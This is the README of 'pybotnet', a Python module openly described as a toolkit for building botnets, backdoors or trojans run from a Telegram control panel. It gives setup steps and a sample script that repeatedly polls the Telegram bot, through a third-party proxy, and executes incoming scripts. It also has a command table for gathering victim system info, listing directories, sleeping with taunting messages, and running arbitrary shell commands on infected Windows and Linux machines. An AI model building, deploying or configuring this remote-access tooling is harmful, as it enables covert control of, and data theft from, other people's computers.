# pybotnet  0.13

A Python module for building [botnet ,backdoor or trojan] with Telegram control panel
- [x] windows
- [x] linux
- [ ] mac :Not tested

### See the [TODO List](https://github.com/onionj/pybotnet/blob/master/TODOLIST.MD) if you want to *help* me <3

### Features:
* get command from telegram and execute scripts 
* get command and send message by third party proxy
* get target info 
* sleep source by Optional message
* get ls (dirctory list)

 


### Requirements:

* Python 3.6 or higher.
* Telegram account
* your account number ID (get it from @userinfobot)
* telegram api token (Get it from the telegram botfather)
```
pip install -r requirements.txt
```

### Sample:

```python
# this is sample_code.py 

from pybotnet import pybotnet
import time


# ! rename configs.py.sample to configs.py
# ! and edit configs.py data
from configs import TELEGRAM_TOKEN, ADMIN_CHAT_ID

# * if you compile code without shell: is_sheel=False
# * show_log: just for debugging
# * send_system_data: send system short info in bot messages

bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
                        show_log=True, send_system_data=True, is_shell=True)

delay = 10

while True:
    print('*'*100)
    bot.get_and_execute_scripts_by_third_party_proxy()
    time.sleep(delay)

```

### Commmands:
*Send this COMMANDs to your api bot in telegram, using the admin account.* \
*If you want the command to run only on one system, write the MAC address of that system first:* \
 `66619484755211 get_info`

COMMAND | Sample | DO THIS | Minimum version required | Works well on: |
--------|--------|---------|--------------------------|----------|
`get_info` | `get_info` |return system info | 0.06 | windows, linux |
`do_sleep \<scconds> \<message (Optional)>` | `do_sleep 99999 hi, i see you!` | \<if message != none : print(message) > ; time.sleep(seccond) | 0.08 | windows, linux |
`cmd \<system command>` | `cmd mkdir new_folder` | run system command in shell or cmd (Be careful not to give endless command like `ping google.com -t`  in windows or `ping google.com` in linux)  TODO:add timeout| 0.07 | windows, linux|
`ls \<route>` | `ls C:\ `,` ls /home` |Returns a list of folders and files in that path | 0.09 | windows, linux |
